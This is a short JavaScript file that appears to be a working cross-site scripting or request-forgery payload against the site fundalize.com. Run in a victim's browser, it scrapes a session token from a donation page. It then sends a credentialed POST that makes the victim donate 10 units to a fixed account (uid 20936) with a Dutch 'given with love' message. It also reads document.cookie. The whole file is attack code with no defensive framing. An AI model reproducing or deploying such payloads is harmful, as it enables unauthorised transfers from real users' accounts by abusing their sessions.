
var xhttp2 = new XMLHttpRequest();
var response;
var SID;

xhttp2.open('GET', 'http://www.fundalize.com/includes/pop_donate.php?&to=20936', true);
xhttp2.onreadystatechange=(e)=>{
	if (xhttp2.readyState === XMLHttpRequest.DONE && xhttp2.status === 200){
		response = xhttp2.response;
		getSID();
		step2();
	}
	else{
		console.log('GET failed');
	}
}
xhttp2.send('');

function getSID(){
	var position = response.search(".value") + 8;
	var endposition = response.search("',document");
	SID = response.substring(position, endposition);
}


function step2(){
	var xhttp = new XMLHttpRequest();
	xhttp.open('POST', 'http://fundalize.com/includes/ajax_useractions.php', true);
	xhttp.withCredentials = true;
	var cookies = document.cookie;
	var params = 'uid=20936&pid='+user_id+'&amount=10&session='+SID+'&message=Met%20liefde%20gegeven%20<3&mode=donate';
	console.log('User ID: ' + user_id);
	console.log('SID: ' + SID);
	
	
	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=UTF-8");
	//xhttp.setRequestHeader("Cookie", cookies);
	xhttp.send(params); 
	
	xhttp.onreadystatechange=(e)=>{
		if (xhttp.readyState === XMLHttpRequest.DONE && xhttp.status === 200){
			console.log('done');
		}
		else{
			console.log('fail');
		}
	}
}
function getCookie(cname) {
var name = cname + "=";
//var decodedCookie = decodeURIComponent(document.cookie);
var decodedCookie = document.cookie;
var ca = decodedCookie.split(';');
for(var i = 0; i <ca.length; i++) {
	var c = ca[i];
	while (c.charAt(0) == ' ') {
	c = c.substring(1);
	}
	if (c.indexOf(name) == 0) {
	return c.substring(name.length, c.length);
	}
}
return "";
}
